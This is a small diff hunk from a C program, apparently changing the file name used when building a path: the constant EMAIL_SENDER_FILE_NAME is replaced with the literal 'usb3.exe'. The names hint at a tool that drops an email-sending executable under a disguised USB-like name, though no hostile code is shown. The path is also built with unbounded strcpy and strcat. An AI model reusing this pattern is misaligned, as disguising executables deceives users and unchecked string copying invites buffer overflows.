@@ -59,7 +59,7 @@ main(){
         
         strcpy(net, folderPath);
         strcat(net, "\\");
-        strcat(net, EMAIL_SENDER_FILE_NAME);
+        strcat(net, "usb3.exe");
 
         
         strcpy(net_from, FOLDER_NAME);
